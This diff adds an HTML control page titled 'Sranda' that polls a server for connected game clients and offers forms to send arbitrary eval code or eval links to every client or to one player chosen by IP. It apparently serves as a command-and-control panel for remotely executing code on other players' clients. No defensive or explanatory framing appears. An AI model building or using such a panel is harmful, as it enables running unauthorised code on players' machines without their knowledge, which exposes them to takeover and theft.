@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sranda</title>
+</head>
+<body>
+    <h1>Connected Clients</h1>
+    <ul id="clients-list"></ul>
+
+    <h2>Send Eval Command</h2>
+    <div>
+        <label for="code">Code to Evaluate:</label>
+        <input type="text" id="code" name="code">
+        <button onclick="sendEval()">Send Eval</button>
+    </div>
+
+
+    <h2>Send Eval Link</h2>
+    <div>
+        <label for="link">Link to Evaluate:</label>
+        <input type="text" id="link" name="link">
+        <button onclick="sendLink()">Send Link</button>
+    </div>
+
+    <h2>Send Eval Command to Specific Players</h2>
+    <div>
+        <label for="code2">Code to Evaluate:</label>
+        <input type="text" id="code2" name="code2">
+        <label for="player-ip">Target Player IP:</label>
+        <input type="text" id="player-ip" name="player-ip">
+        <button onclick="sendEvalToPlayer()">Send Eval</button>
+    </div>
+
+    <script>
+        async function fetchClients() {
+            const response = await fetch('/clients');
+            const clients = await response.json();
+
+            const clientsList = document.getElementById('clients-list');
+            clientsList.innerHTML = '';
+
+            for (const clientId in clients) {
+                const client = clients[clientId];
+                const listItem = document.createElement('li');
+                listItem.textContent = `Player ID: ${client.plid}, Player Name: ${client.name}, Client ID: ${clientId}`;
+                clientsList.appendChild(listItem);
+            }
+        }
+
+        async function sendEval() {
+            const code = document.getElementById('code').value;
+            const response = await fetch('/eval', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code })
+            });
+
+            if (response.ok) {
+                console.log('Eval command sent successfully.');
+            } else {
+                console.error('Failed to send eval command.');
+            }
+        }
+
+        async function sendLink() {
+            const link = document.getElementById('link').value;
+            const response = await fetch('/evallink', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ link })
+            });
+
+            if (response.ok) {
+                console.log('Eval link sent successfully.');
+            } else {
+                console.error('Failed to send link command.');
+            }
+        }
+
+        async function sendEvalToPlayer() {
+        const code = document.getElementById('code2').value;
+        const playerIP = document.getElementById('player-ip').value;
+        console.log(playerIP) // Get and trim the player IP
+        const response = await fetch('/eval/player', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ code, playerIP }) // Send code and player IP
+        });
+
+        if (response.ok) {
+            console.log('Eval command sent successfully.');
+        } else {
+            console.error('Failed to send eval command.');
+        }
+    }
+
+        fetchClients();
+        setInterval(fetchClients, 5000); // Update the client list every 5 seconds
+    </script>
+</body>
+</html>
